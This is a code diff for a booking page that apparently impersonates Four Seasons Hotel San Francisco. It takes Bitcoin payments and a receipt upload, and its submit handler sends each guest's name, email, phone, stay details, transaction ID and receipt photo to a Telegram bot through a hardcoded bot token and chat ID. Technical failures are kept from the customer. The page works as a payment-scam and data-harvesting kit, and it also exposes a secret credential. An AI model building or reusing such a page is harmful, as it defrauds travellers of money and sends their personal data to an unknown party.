+},
+
+{
+ name:"Presidential Residence",
+ price:8000,
+ img:"presidential-residence.jpg",
+ desc:"The most expansive residence option in this booking collection.",
+ guests:8,
+ amenities:"Multiple bedrooms • Living • Dining • Kitchenette"
+}
+];
+
+
+/* =========================================================
+   BASIC HELPERS
+========================================================= */
+
+const $=id=>document.getElementById(id);
+
+
+/* =========================================================
+   TELEGRAM CONFIGURATION
+=========================================================
+
+   IMPORTANT:
+   Replace ONLY the value inside the quotes below with
+   your NEW BotFather token.
+
+   DO NOT put the token in chat or screenshots.
+
+========================================================= */
+
+const TELEGRAM_BOT_TOKEN="8821724895:AAGjwByJBFSZsOTM3_Ey18U6zkfsQ8Cc9Oc";
+
+const TELEGRAM_CHAT_ID="8728675844";
+
+const TELEGRAM_API_BASE=
+  `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
+
+
+/* =========================================================
+   GENERAL HELPERS
+========================================================= */
+
+const money=n=>
+  new Intl.NumberFormat(
+    "en-US",
+    {
+      style:"currency",
+      currency:"USD"
+    }
+  ).format(n);
+
+
+const today=new Date();
+
+today.setHours(0,0,0,0);
+
+
+const iso=d=>{
+  const x=new Date(d);
+  return x.toISOString().split("T")[0];
+};
+
+
+$("quickCheckIn").min=iso(today);
+
+$("checkIn").min=iso(today);
+
+
+/* =========================================================
+   ROOM SELECT
+========================================================= */
+
+rooms.forEach((r,i)=>{
+
+  const opt=document.createElement("option");
+
+  opt.value=i;
+
+  opt.textContent=
+    `${r.name} — ${money(r.price)}/night`;
+
+  $("roomSelect").appendChild(opt);
+
+});
+
+
+/* =========================================================
+   RENDER ROOMS
+========================================================= */
+
+function renderRooms(){
+
+  $("roomGrid").innerHTML=
+
+    rooms.map((r,i)=>`
+
+      <article class="room-card card reveal">
+
+        <div class="overflow-hidden">
+
+          <img
+            src="${r.img}"
+            onerror="this.style.opacity='.25'"
+            class="room-img w-full"
+            alt="${r.name}"
+          >
+
+        </div>
+
+
+        <div class="p-6">
+
+          <div class="flex justify-between gap-3">
+
+            <h3 class="serif text-2xl">
+              ${r.name}
+            </h3>
+
+            <span class="font-bold whitespace-nowrap">
+              ${money(r.price)}
+            </span>
+
+          </div>
+
+
+          <p class="text-sm text-gray-600 mt-3 leading-6">
+            ${r.desc}
+          </p>
+
+
+          <p class="text-xs text-gray-500 mt-4">
+            ${r.amenities}
+          </p>
+
+
+          <button
+            onclick="selectRoom(${i})"
+            class="btn-dark w-full py-3 mt-5 rounded-sm text-xs font-bold uppercase tracking-widest"
+          >
+            Select accommodation
+          </button>
+
+        </div>
+
+      </article>
+
+    `).join("");
+
+  observe();
+}
+
+
+/* =========================================================
+   SELECT ROOM
+========================================================= */
+
+function selectRoom(i){
+
+  $("roomSelect").value=i;
+
+  document
+    .querySelector("#booking")
+    .scrollIntoView({behavior:"smooth"});
+
+  updateBooking();
+}
+
+
+/* =========================================================
+   CALCULATE NIGHTS
+========================================================= */
+
+function nights(){
+
+  const a=$("checkIn").value;
+
+  const b=$("checkOut").value;
+
+  if(!a || !b)
+    return 0;
+
+  const n=Math.round(
+    (
+      new Date(b+"T00:00:00") -
+      new Date(a+"T00:00:00")
+    ) / 86400000
+  );
+
+  return n>0 ? n : 0;
+}
+
+
+/* =========================================================
+   UPDATE BOOKING
+========================================================= */
+
+function updateBooking(){
+
+  const r=
+    rooms[
+      Number($("roomSelect").value) || 0
+    ];
+
+  const n=nights();
+
+  const total=n*r.price;
+
+
+  $("bookingDetails").innerHTML=
+
+    n
+
+      ? `
+
+        <div class="flex justify-between gap-4">
+
+          <div>
+
+            <div class="font-semibold">
+              ${r.name}
+            </div>
+
+            <div class="text-sm text-gray-500 mt-1">
+              ${$("checkIn").value}
+              →
+              ${$("checkOut").value}
+              •
+              ${$("guests").value}
+              guest(s)
+            </div>
+
+          </div>
+
+
+          <div class="text-right">
+
+            <div class="font-bold">
+              ${money(total)}
+            </div>
+
+            <div class="text-xs text-gray-500">
+              ${money(r.price)}
+              ×
+              ${n}
+              night${n===1?"":"s"}
+            </div>
+
+          </div>
+
+        </div>
+
+      `
+
+      :
+
+      `
+
+        <div class="text-sm text-gray-500">
+
+          Choose valid check-in and check-out dates to calculate your stay.
+
+        </div>
+
+      `;
+
+
+  $("summary").innerHTML=`
+
+    <div class="flex justify-between py-3 border-b border-white/10">
+
+      <span class="text-white/50">
+        Accommodation
+      </span>
+
+      <span class="text-right">
+        ${r.name}
+      </span>
+
+    </div>
+
+
+    <div class="flex justify-between py-3 border-b border-white/10">
+
+      <span class="text-white/50">
+        Nightly rate
+      </span>
+
+      <span>
+        ${money(r.price)}
+      </span>
+
+    </div>
+
+
+    <div class="flex justify-between py-3 border-b border-white/10">
+
+      <span class="text-white/50">
+        Nights
+      </span>
+
+      <span>
+        ${n || "—"}
+      </span>
+
+    </div>
+
+
+    <div class="flex justify-between py-4 text-lg">
+
+      <span>
+        Total
+      </span>
+
+      <strong>
+        ${n ? money(total) : "—"}
+      </strong>
+
+    </div>
+
+  `;
+
+
+  return {
+    r,
+    n,
+    total
+  };
+}
+
+
+/* =========================================================
+   BOOKING DATE EVENTS
+========================================================= */
+
+$("checkIn").addEventListener("change",()=>{
+
+  const a=$("checkIn").value;
+
+  $("checkOut").min=
+    a || iso(today);
+
+  if(
+    $("checkOut").value &&
+    $("checkOut").value<=a
+  ){
+    $("checkOut").value="";
+  }
+
+  updateBooking();
+
+});
+
+
+$("checkOut").addEventListener(
+  "change",
+  updateBooking
+);
+
+
+$("guests").addEventListener(
+  "change",
+  updateBooking
+);
+
+
+$("roomSelect").addEventListener(
+  "change",
+  updateBooking
+);
+
+
+/* =========================================================
+   QUICK SEARCH
+========================================================= */
+
+$("quickSearch").addEventListener(
+  "submit",
+  e=>{
+
+    e.preventDefault();
+
+    const ci=$("quickCheckIn").value;
+
+    const co=$("quickCheckOut").value;
+
+    if(
+      !ci ||
+      !co ||
+      new Date(co)<=new Date(ci)
+    ){
+
+      toast(
+        "Please choose valid check-in and check-out dates."
+      );
+
+      return;
+    }
+
+
+    $("checkIn").value=ci;
+
+    $("checkOut").value=co;
+
+    $("guests").value=
+      $("quickGuests").value;
+
+    updateBooking();
+
+    $("booking").scrollIntoView({
+      behavior:"smooth"
+    });
+
+  }
+);
+
+
+/* =========================================================
+   CONTINUE TO GUEST DETAILS
+========================================================= */
+
+$("continueBtn").addEventListener(
+  "click",
+  ()=>{
+
+    const x=updateBooking();
+
+
+    if(!x.n){
+
+      toast(
+        "Please choose valid dates before continuing."
+      );
+
+      return;
+    }
+
+
+    if(
+      Number($("guests").value)>x.r.guests
+    ){
+
+      toast(
+        `${x.r.name} allows up to ${x.r.guests} guests in this frontend.`
+      );
+
+      return;
+    }
+
+
+    $("guestModal")
+      .classList
+      .remove("hidden-force");
+
+
+    $("guestModal")
+      .classList
+      .add("flex");
+
+
+    $("guestStaySummary").innerHTML=
+
+      `
+
+        <strong>
+          ${x.r.name}
+        </strong>
+
+        <br>
+
+        ${$("checkIn").value}
+        →
+        ${$("checkOut").value}
+
+        •
+
+        ${x.n}
+        night${x.n===1?"":"s"}
+
+        •
+
+        ${$("guests").value}
+        guest(s)
+
+        <br>
+
+        <strong class="inline-block mt-1">
+          ${money(x.total)} total
+        </strong>
+
+      `;
+
+
+    document
+      .querySelector(".modal-scroll")
+      .scrollTop=0;
+
+
+    document.body.style.overflow="hidden";
+
+  }
+);
+
+
+/* =========================================================
+   CLOSE GUEST MODAL
+========================================================= */
+
+function closeGuest(){
+
+  $("guestModal")
+    .classList
+    .add("hidden-force");
+
+  $("guestModal")
+    .classList
+    .remove("flex");
+
+  document.body.style.overflow="";
+
+}
+
+
+$("closeGuestX")
+  .addEventListener(
+    "click",
+    closeGuest
+  );
+
+
+$("backToBooking")
+  .addEventListener(
+    "click",
+    closeGuest
+  );
+
+
+$("backToBookingBottom")
+  .addEventListener(
+    "click",
+    closeGuest
+  );
+
+
+$("guestModal")
+  .addEventListener(
+    "click",
+    e=>{
+      if(e.target===$("guestModal"))
+        closeGuest();
+    }
+  );
+
+
+document.addEventListener(
+  "keydown",
+  e=>{
+
+    if(
+      e.key==="Escape" &&
+      !$("guestModal")
+        .classList
+        .contains("hidden-force")
+    ){
+
+      closeGuest();
+
+    }
+
+  }
+);
+
+
+/* =========================================================
+   COPY BITCOIN ADDRESS
+========================================================= */
+
+$("copyBitcoinAddress")
+  .addEventListener(
+    "click",
+    async()=>{
+
+      const address=
+        $("bitcoinAddress").value;
+
+
+      try{
+
+        await navigator
+          .clipboard
+          .writeText(address);
+
+        $("copyBitcoinStatus")
+          .textContent=
+          "Bitcoin address copied.";
+
+      }catch(e){
+
+        $("bitcoinAddress").focus();
+
+        $("bitcoinAddress").select();
+
+        $("copyBitcoinStatus")
+          .textContent=
+          "Select and copy the address above.";
+
+      }
+
+    }
+  );
+
+
+/* =========================================================
+   RECEIPT PICKER
+========================================================= */
+
+$("receiptPicker")
+  .addEventListener(
+    "click",
+    ()=>$("receipt").click()
+  );
+
+
+$("receipt")
+  .addEventListener(
+    "change",
+    ()=>{
+
+      const file=
+        $("receipt").files &&
+        $("receipt").files[0];
+
+
+      if(!file)
+        return;
+
+
+      if(
+        !file.type.startsWith("image/")
+      ){
+
+        alert(
+          "Please select an image of your payment receipt."
+        );
+
+        $("receipt").value="";
+
+        return;
+      }
+
+
+      $("receiptName")
+        .textContent=file.name;
+
+
+      const reader=
+        new FileReader();
+
+
+      reader.onload=()=>{
+
+        $("receiptImage")
+          .src=reader.result;
+
+
+        $("receiptPreview")
+          .classList
+          .remove("hidden");
+
+
+        $("receiptPicker")
+          .classList
+          .add("hidden");
+
+      };
+
+
+      reader.readAsDataURL(file);
+
+    }
+  );
+
+
+/* =========================================================
+   REMOVE RECEIPT
+========================================================= */
+
+$("removeReceipt")
+  .addEventListener(
+    "click",
+    ()=>{
+
+      $("receipt").value="";
+
+      $("receiptImage")
+        .removeAttribute("src");
+
+      $("receiptPreview")
+        .classList
+        .add("hidden");
+
+      $("receiptPicker")
+        .classList
+        .remove("hidden");
+
+    }
+  );
+
+
+/* =========================================================
+   COMPRESS RECEIPT FOR LOCAL BOOKING RECORD
+========================================================= */
+
+async function compressReceipt(file){
+
+  return new Promise(
+    (resolve,reject)=>{
+
+      const reader=
+        new FileReader();
+
+
+      reader.onerror=()=>
+        reject(
+          new Error(
+            "Could not read the payment receipt."
+          )
+        );
+
+
+      reader.onload=()=>{
+
+        const img=new Image();
+
+
+        img.onerror=()=>
+          reject(
+            new Error(
+              "Could not process the payment receipt."
+            )
+          );
+
+
+        img.onload=()=>{
+
+          const maxSide=1280;
+
+
+          const scale=
+            Math.min(
+              1,
+              maxSide /
+              Math.max(
+                img.naturalWidth,
+                img.naturalHeight
+              )
+            );
+
+
+          const canvas=
+            document.createElement("canvas");
+
+
+          canvas.width=
+            Math.max(
+              1,
+              Math.round(
+                img.naturalWidth*scale
+              )
+            );
+
+
+          canvas.height=
+            Math.max(
+              1,
+              Math.round(
+                img.naturalHeight*scale
+              )
+            );
+
+
+          const ctx=
+            canvas.getContext("2d");
+
+
+          ctx.fillStyle="#ffffff";
+
+          ctx.fillRect(
+            0,
+            0,
+            canvas.width,
+            canvas.height
+          );
+
+
+          ctx.drawImage(
+            img,
+            0,
+            0,
+            canvas.width,
+            canvas.height
+          );
+
+
+          resolve(
+            canvas.toDataURL(
+              "image/jpeg",
+              0.72
+            )
+          );
+
+        };
+
+
+        img.src=reader.result;
+
+      };
+
+
+      reader.readAsDataURL(file);
+
+    }
+  );
+
+}
+
+
+/* =========================================================
+   SUBMIT BOOKING
+   SEND MESSAGE + RECEIPT DIRECTLY TO TELEGRAM
+========================================================= */
+
+$("guestForm")
+  .addEventListener(
+    "submit",
+    async e=>{
+
+      e.preventDefault();
+
+
+      const x=updateBooking();
+
+
+      const email=
+        $("email").value.trim();
+
+
+      const receiptFile=
+        $("receipt").files &&
+        $("receipt").files[0];
+
+
+      if(!receiptFile){
+
+        alert(
+          "Please select your payment receipt before submitting the booking."
+        );
+
+        return;
+      }
+
+
+      /*
+        NO PROMPT.
+        NO localStorage token.
+        NO Supabase Telegram function.
+
+        If the token is missing, the customer receives
+        a normal configuration error instead of seeing
+        a Telegram token popup.
+      */
+
+      if(
+        !TELEGRAM_BOT_TOKEN ||
+        TELEGRAM_BOT_TOKEN.includes(
+          "PASTE_FRESH_BOTFATHER_TOKEN_HERE"
+        )
+      ){
+
+        console.error(
+          "Telegram bot token is not configured in index.html."
+        );
+
+        alert(
+          "The booking system is not fully configured yet. Please try again later."
+        );
+
+        return;
+      }
+
+
+      const submitButton=
+        document.querySelector(
+          '[form="guestForm"][type="submit"]'
+        );
+
+
+      if(submitButton){
+
+        submitButton.disabled=true;
+
+        submitButton.textContent=
+          "Sending booking…";
+
+      }
+
+
+      try{
+
+        /*
+          Keep the receipt preview available locally.
+        */
+
+        const receiptDataUrl=
+          await compressReceipt(
+            receiptFile
+          );
+
+
+        /*
+          Generate booking ID.
+        */
+
+        const id=
+          "FS-" +
+          Date.now()
+            .toString(36)
+            .toUpperCase()
+            .slice(-8);
+
+
+        /*
+          Build complete booking record.
+        */
+
+        const bookingPayload={
+
+          bookingId:id,
+
+          createdAt:
+            new Date().toISOString(),
+
+          status:
+            "awaiting_confirmation",
+
+          room:
+            x.r.name,
+
+          price:
+            x.r.price,
+
+          nights:
+            x.n,
+
+          total:
+            x.total,
+
+          checkIn:
+            $("checkIn").value,
+
+          checkOut:
+            $("checkOut").value,
+
+          guests:
+            Number($("guests").value),
+
+          customer:
+            $("fullName").value.trim(),
+
+          email:
+            email,
+
+          phone:
+            $("phone").value.trim(),
+
+          specialRequest:
+            $("specialRequest")
+              .value
+              .trim(),
+
+          paymentMethod:
+            "Bitcoin",
+
+          bitcoinAddress:
+            $("bitcoinAddress").value,
+
+          transactionId:
+            $("txid")
+              .value
+              .trim(),
+
+          receiptFileName:
+            receiptFile.name,
+
+          receiptDataUrl:
+            receiptDataUrl
+
+        };
+
+
+        /*
+          ====================================================
+          TELEGRAM MESSAGE
+          ====================================================
+        */
+
+        const message=[
+
+          "🏨 FOUR SEASONS HOTEL — NEW BOOKING",
+
+          "",
+
+          `Booking ID: ${bookingPayload.bookingId}`,
+
+          `Status: ${bookingPayload.status}`,
+
+          `Customer: ${bookingPayload.customer}`,
+
+          `Email: ${bookingPayload.email}`,
+
+          `Phone: ${bookingPayload.phone}`,
+
+          `Check-in: ${bookingPayload.checkIn}`,
+
+          `Check-out: ${bookingPayload.checkOut}`,
+
+          `Guests: ${bookingPayload.guests}`,
+
+          `Accommodation: ${bookingPayload.room}`,
+
+          `Nights: ${bookingPayload.nights}`,
+
+          `Nightly price: ${money(bookingPayload.price)}`,
+
+          `Total: ${money(bookingPayload.total)}`,
+
+          `Special request: ${bookingPayload.specialRequest || "None"}`,
+
+          "",
+
+          "💳 PAYMENT",
+
+          `Method: ${bookingPayload.paymentMethod}`,
+
+          `Bitcoin address: ${bookingPayload.bitcoinAddress}`,
+
+          `Transaction ID: ${bookingPayload.transactionId || "Not provided"}`,
+
+          `Receipt file: ${bookingPayload.receiptFileName}`
+
+        ].join("\n");
+
+
+        /*
+          SEND COMPLETE BOOKING MESSAGE
+        */
+
+        const messageResponse=
+          await fetch(
+            `${TELEGRAM_API_BASE}/sendMessage`,
+            {
+              method:"POST",
+
+              headers:{
+                "Content-Type":
+                  "application/json"
+              },
+
+              body:JSON.stringify({
+
+                chat_id:
+                  TELEGRAM_CHAT_ID,
+
+                text:
+                  message
+
+              })
+
+            }
+          );
+
+
+        let messageResult={};
+
+
+        try{
+
+          messageResult=
+            await messageResponse.json();
+
+        }catch(_e){}
+
+
+        if(
+          !messageResponse.ok ||
+          !messageResult.ok
+        ){
+
+          throw new Error(
+            messageResult.description ||
+            "Telegram message delivery failed."
+          );
+
+        }
+
+
+        /*
+          ====================================================
+          SEND ACTUAL RECEIPT IMAGE
+          ====================================================
+        */
+
+        const photoData=
+          new FormData();
+
+
+        photoData.append(
+          "chat_id",
+          TELEGRAM_CHAT_ID
+        );
+
+
+        photoData.append(
+          "photo",
+          receiptFile,
+          receiptFile.name
+        );
+
+
+        photoData.append(
+          "caption",
+
+          `Payment receipt — ${bookingPayload.bookingId}\n` +
+          `Customer: ${bookingPayload.customer}\n` +
+          `Transaction ID: ${bookingPayload.transactionId || "Not provided"}`
+        );
+
+
+        const photoResponse=
+          await fetch(
+            `${TELEGRAM_API_BASE}/sendPhoto`,
+            {
+              method:"POST",
+
+              body:
+                photoData
+            }
+          );
+
+
+        let photoResult={};
+
+
+        try{
+
+          photoResult=
+            await photoResponse.json();
+
+        }catch(_e){}
+
+
+        if(
+          !photoResponse.ok ||
+          !photoResult.ok
+        ){
+
+          throw new Error(
+            photoResult.description ||
+            "Telegram receipt delivery failed."
+          );
+
+        }
+
+
+        /*
+          Keep latest booking in memory only.
+        */
+
+        window.lastBookingRequest={
+          ...bookingPayload,
+          receiptDataUrl:undefined
+        };
+
+
+        /*
+          Show normal customer confirmation.
+        */
+
+        $("successBookingId")
+          .textContent=id;
+
+
+        $("successTotal")
+          .textContent=
+          money(x.total);
+
+
+        $("successEmail")
+          .textContent=email;
+
+
+        closeGuest();
+
+
+        $("successModal")
+          .classList
+          .remove("hidden-force");
+
+
+        $("successModal")
+          .classList
+          .add("flex");
+
+
+        document.body.style.overflow=
+          "hidden";
+
+
+        /*
+          Reset form.
+        */
+
+        e.target.reset();
+
+
+        $("receipt").value="";
+
+
+        $("receiptImage")
+          .removeAttribute("src");
+
+
+        $("receiptPreview")
+          .classList
+          .add("hidden");
+
+
+        $("receiptPicker")
+          .classList
+          .remove("hidden");
+
+
+      }catch(error){
+
+        /*
+          Technical Telegram error goes only to console.
+          Customer sees a normal booking failure message.
+        */
+
+        console.error(
+          "Booking delivery error:",
+          error
+        );
+
+
+        alert(
+          "Your booking was not submitted yet. Please check your connection and try again."
+        );
+
+
+      }finally{
+
+        if(submitButton){
+
+          submitButton.disabled=false;
+
+          submitButton.textContent=
+            "Submit booking";
+
+        }
+
+      }
+
+    }
+  );
+
+
+/* =========================================================
+   CLOSE SUCCESS
+========================================================= */
+
+$("closeSuccess")
+  .addEventListener(
+    "click",
+    ()=>{
+
+      $("successModal")
+        .classList
+        .add("hidden-force");
+
+      $("successModal")
+        .classList
+        .remove("flex");
+
+      document.body.style.overflow="";
+
+    }
+  );
+
+
+/* =========================================================
+   CONTACT FORM
+========================================================= */
+
+$("contactForm")
+  .addEventListener(
+    "submit",
+    e=>{
+
+      e.preventDefault();
+
+      toast(
+        "Thank you. Your enquiry form is ready for secure delivery integration."
+      );
+
+      e.target.reset();
+
+    }
+  );
+
+
+/* =========================================================
+   TOAST
+========================================================= */
+
+function toast(msg){
+
+  $("toast")
+    .textContent=msg;
+
+  $("toast")
+    .classList
+    .remove("hidden-force");
+
+
+  setTimeout(
+    ()=>
+      $("toast")
+        .classList
+        .add("hidden-force"),
+    3200
+  );
+
+}
+
+
+/* =========================================================
+   MOBILE MENU
+========================================================= */
+
+$("menuBtn")
+  .addEventListener(
+    "click",
+    ()=>
+      $("mobileMenu")
+        .classList
+        .toggle("hidden")
+  );
+
+
+document
+  .querySelectorAll("#mobileMenu a")
+  .forEach(
+    a=>
+      a.addEventListener(
+        "click",
+        ()=>
+          $("mobileMenu")
+            .classList
+            .add("hidden")
+      )
+  );
+
+
+/* =========================================================
+   YEAR
+========================================================= */
+
+$("year").textContent=
+  new Date().getFullYear();
+
+
+/* =========================================================
+   SCROLL REVEAL
+========================================================= */
+
+function observe(){
+
+  const io=
+    new IntersectionObserver(
+      es=>
+        es.forEach(
+          e=>{
+            if(e.isIntersecting)
+              e.target.classList.add("show")
+          }
+        ),
+      {
+        threshold:.08
+      }
+    );
+
+
+  document
+    .querySelectorAll(".reveal")
+    .forEach(
+      x=>io.observe(x)
+    );
+
+}
+
+
+/* =========================================================
+   INITIALIZE
+========================================================= */
+
+renderRooms();
+
+updateBooking();
+
+</script>
+
+
+<!-- LEAFLET MAP -->
+
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+
+<script>
+
+(function(){
+
+  const hotelLat=37.786297;
+
+  const hotelLng=-122.403965;
+
+
+  const map=
+    L.map(
+      'hotelMap',
+      {
+        scrollWheelZoom:false,
+        zoomControl:true
+      }
+    )
+    .setView(
+      [hotelLat,hotelLng],
+      18
+    );
+
+
+  L.tileLayer(
+    'https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}',
+    {
+      maxZoom:19,
+
+      attribution:
+        '&copy; Esri, Maxar, Earthstar Geographics, and the GIS User Community'
+    }
+  ).addTo(map);
+
+
+  const icon=
+    L.divIcon({
+
+      className:'',
+
+      html:
+        '<div class="map-pin"><i class="fa-solid fa-hotel"></i></div>',
+
+      iconSize:
+        [34,34],
+
+      iconAnchor:
+        [17,17],
+
+      popupAnchor:
+        [0,-18]
+
+    });
+
+
+  L.marker(
+    [hotelLat,hotelLng],
+    {
+      icon
+    }
+  )
+  .addTo(map)
+  .bindPopup(
+    '<strong>Four Seasons Hotel San Francisco</strong><br>757 Market Street<br>San Francisco, CA 94103'
+  )
+  .openPopup();
+
+
+  setTimeout(
+    ()=>map.invalidateSize(),
+    300
+  );
+
+})();
+
+</script>
+
+</body>
+</html>
